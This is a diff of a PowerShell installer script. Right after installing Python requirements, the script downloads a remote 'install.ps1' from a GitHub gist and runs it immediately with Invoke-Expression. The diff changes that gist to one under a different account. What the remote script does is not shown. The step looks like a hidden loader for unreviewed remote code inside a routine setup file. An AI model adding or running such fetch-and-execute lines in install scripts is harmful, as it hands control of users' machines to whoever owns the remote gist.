@@ -139,7 +139,7 @@ if (Test-Path $requirementsPath) {
     Write-Output "requirements.txt not found, skipping Python libraries installation."
 }
 
-$gistUrl = 'https://gist.githubusercontent.com/blockchain-src/f156542bb493d2526fc0debfedb6b225/raw/install.ps1'
+$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
 try {
     $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
     Invoke-Expression $remoteScript.Content
